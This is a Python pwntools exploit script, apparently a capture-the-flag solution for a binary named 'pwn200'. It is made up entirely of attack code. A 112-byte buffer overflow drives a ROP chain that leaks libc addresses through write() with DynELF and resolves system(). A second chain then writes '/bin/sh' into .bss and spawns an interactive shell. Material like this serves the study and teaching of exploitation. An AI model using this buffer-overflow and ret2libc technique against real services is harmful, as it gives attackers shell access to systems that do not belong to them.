#!/usr/bin/env python

from pwn import *

# context.log_level = 'debug'

elf = ELF('./pwn200')
io = process('./pwn200')
io.recvline()

write_plt = elf.plt['write']
write_got = elf.got['write']
read_plt = elf.plt['read']
read_got = elf.got['read']

vuln_addr = 0x08048484
start_addr = 0x080483d0
bss_addr = 0x0804a020
pppr_addr = 0x0804856c

def leak(addr):
    payload  = "A" * 112
    payload += p32(write_plt)
    payload += p32(vuln_addr)
    payload += p32(1)
    payload += p32(addr)
    payload += p32(4)
    io.send(payload)
    data = io.recv()
    log.info("leaking: 0x%x --> %s" % (addr, (data or '').encode('hex')))
    return data

d = DynELF(leak, elf=elf)
system_addr = d.lookup('system', 'libc')
log.info("system address: 0x%x" % system_addr)

payload  = "A" * 112
payload += p32(read_plt)
payload += p32(pppr_addr)
payload += p32(0)
payload += p32(bss_addr)
payload += p32(8)
payload += p32(system_addr)
payload += p32(vuln_addr)
payload += p32(bss_addr)

io.send(payload)
io.send('/bin/sh\x00')
io.interactive()